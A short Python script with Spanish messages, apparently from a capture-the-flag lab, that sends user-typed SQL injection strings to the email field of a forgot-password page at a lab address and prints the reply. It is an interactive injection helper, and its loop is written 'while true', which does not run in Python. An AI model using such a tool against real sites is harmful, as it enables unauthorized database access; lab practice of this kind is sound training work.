``` python

#!/usr/bin/python3

import signal
import re
import sys
import requests

from pwn import *

# Ctrl+C
def def_handler(sig, frame):
	print("\n[!] Saliendo...\n")
	sys.exit(1)
	
signal.signal(signal.SIGINT, def_handler)

# Variables globales
forgot_url = "http://10.10.10.31/cmsdata/forgot.php"

def makeRequest(sql_query):

	try:
		forgot_data = {
			'email': '%s' % sql_query
		}
	
		r = requests.post(forgot_url, data=forgot_data)
	
		response = re.findall(r'h2.*', r.text)[0].split('>')[1].lstrip()
	
		log.info(response)
		
	except:
		log.failure("Ha ocurrido un error en la query")

if __name__ == '__main__':
	
	while true:
		sql_query = input("[+] Email: ")
		makeRequest(sql_query.strip('\n'))

```
